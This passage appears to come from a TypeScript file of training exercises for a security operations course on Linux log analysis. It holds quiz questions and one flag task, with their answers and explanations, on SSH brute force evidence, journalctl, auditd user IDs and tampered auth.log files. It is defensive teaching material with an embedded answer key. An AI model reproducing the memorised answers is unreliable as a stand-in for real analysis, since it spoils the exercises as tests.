            "The critical question after a brute force attack is 'did they get in?' The grep for 'Accepted' from the same source IP directly answers this. 'Accepted' in auth.log is the SSH daemon's log message for a successful authentication (as opposed to 'Failed password'). If that grep returns any results, the attack succeeded and the incident severity jumps dramatically — from 'active attack' to 'active compromise'. You would then investigate what the attacker did during the session using auditd logs.",
          xp: 30,
        },
      ],
    } satisfies LogAnalysisTask,

    // -------------------------------------------------------------------------
    // Flag Task
    // -------------------------------------------------------------------------
    {
      type: "flag",
      id: "linux-logs-flag1",
      prompt:
        "Look at the SSH brute force log event above. What is the source IP address of the attacker? Look at the 'source.ip' field in the raw log.",
      answer: "185.220.101.45",
      hint: "The attacker's IP address is in the 'source.ip' field of the raw log, and also appears in the human-readable syslog message field. It is a public IP address in the format X.X.X.X.",
      xp: 20,
    } satisfies FlagTask,

    // -------------------------------------------------------------------------
    // Question 2 — journalctl
    // -------------------------------------------------------------------------
    {
      type: "question",
      id: "linux-logs-q2",
      question:
        "You need to check what the SSH service logged on November 22, 2024 between midnight and 06:00 AM. Which journalctl command would filter for exactly this?",
      options: [
        "journalctl -u sshd --since '2024-11-22 00:00:00' --until '2024-11-22 06:00:00'",
        "cat /var/log/auth.log | grep sshd | head -100",
        "systemctl status sshd",
        "ps aux | grep sshd",
      ],
      answer: 0,
      explanation:
        "journalctl is the tool for querying the systemd journal. The '-u sshd' flag filters by unit (the sshd.service). '--since' and '--until' define a time range in 'YYYY-MM-DD HH:MM:SS' format. Together this gives you all SSH daemon log entries for exactly the time window of interest — perfect for investigating an incident that occurred during a specific window. 'systemctl status sshd' only shows recent status, and 'ps aux' shows running processes, not log history.",
      xp: 25,
    } satisfies QuestionTask,

    // -------------------------------------------------------------------------
    // Question 3
    // -------------------------------------------------------------------------
    {
      type: "question",
      id: "linux-logs-q3",
      question:
        "An auditd event shows 'auid=1001' and 'euid=0'. The /etc/passwd file shows 'alice:x:1001:1001:Alice:/home/alice:/bin/bash'. What does this auditd record tell you?",
      options: [
        "An anonymous user (auid=1001 means unknown) is running as root — this is a system process",
        "Alice (UID 1001) is the original logged-in user (auid = audit user ID, stays constant through su/sudo). euid=0 means the command ran with effective root privileges. This means Alice used sudo or su to escalate to root and execute this command",
        "Alice's account has UID 0, making her a superuser by default",
        "The command failed because euid=0 indicates a permission denial",
      ],
      answer: 1,
      explanation:
        "In auditd, 'auid' (Audit User ID) is set when a user logs in and remains constant throughout their session — even after sudo or su. This is specifically designed for accountability: you can always trace an action back to the original login. 'euid' (Effective User ID) changes when privileges are elevated. euid=0 = running as root. So auid=1001 + euid=0 means: Alice logged in (auid=1001) and then escalated to root (euid=0) via sudo or su to run this command. This is critical for post-incident attribution — even if an attacker compromises a service account and escalates, auid still tracks who originally authenticated.",
      xp: 30,
    } satisfies QuestionTask,

    // -------------------------------------------------------------------------
    // Question 4
    // -------------------------------------------------------------------------
    {
      type: "question",
      id: "linux-logs-q4",
      question:
        "While reviewing a compromised server's /var/log/auth.log, you notice the file has a 12-hour gap — entries go from 14:32 to 02:47 with nothing in between, then resume. The file modification time (from 'ls -la') is 02:47. What does this suggest?",
      options: [
        "The server was offline during those 12 hours — this is normal maintenance downtime",
        "An attacker likely edited or replaced auth.log to delete evidence of their activity during those 12 hours. The file modification time matching the last entry suggests the file was written-to at 02:47, which is when the editing stopped. Check SIEM for any log forwarding that captured the missing period before it was deleted",
        "The syslog daemon crashed and restarted at 02:47 — this is a software bug, not an attack",
        "Log rotation occurred at 02:47 — the missing period is in /var/log/auth.log.1",
      ],
      answer: 1,
      explanation:
        "A 12-hour gap in auth.log is a major red flag. Legitimate causes (server offline, syslog crash, log rotation) are possible but should be verifiable: check if the server has uptime records covering that period ('uptime' command or /proc/uptime), check if the syslog daemon shows restart events in /var/log/syslog, and check if auth.log.1 or auth.log.gz (rotated backup) covers the missing period. If none of these explain the gap, log tampering is likely. This is why SOC teams use SIEM log forwarding — if logs were forwarded to the SIEM before the attacker deleted them, you may still be able to recover the missing period from the SIEM's index.",
      xp: 35,
    } satisfies QuestionTask,
  ],
};

// ---------------------------------------------------------------------------
// Exports
// ---------------------------------------------------------------------------

const rooms: Room[] = [
  activeDirectory,
  windowsEventLogs,
  linuxFundamentals,
  linuxLogAnalysis,
];

export default rooms;
